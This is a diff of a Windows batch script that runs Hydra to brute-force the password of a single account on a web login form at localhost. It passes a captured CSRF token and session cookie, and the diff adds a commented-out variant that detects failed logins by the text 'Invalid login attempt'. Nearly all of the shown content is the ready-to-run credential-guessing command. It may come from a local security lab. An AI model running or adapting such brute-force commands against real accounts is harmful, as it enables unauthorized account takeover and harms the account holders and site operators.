@@ -24,4 +24,6 @@ set SESSIONNAME=%%x
 REM CRACK THE PASSWORD WITH HYDRA
 hydra -l matthew@example.com -P passlist.txt -F -V -t 5 -s 5000 127.0.0.1 http-post-form "/Account/Login:Email=matthew@example.com&Password=^PASS^&__RequestVerificationToken=%CSRF%&RememberMe=false:S=Location\: /:H=Cookie: %SESSIONNAME%=%SESSIONID%"
 
+REM hydra -l matthew@example.com -P passlist.txt -F -V -t 5 -s 5000 127.0.0.1 http-post-form "/Account/Login:Email=matthew@example.com&Password=^PASS^&__RequestVerificationToken=%CSRF%&RememberMe=false:F=Invalid login attempt:H=Cookie: %SESSIONNAME%=%SESSIONID%"
+
 pause
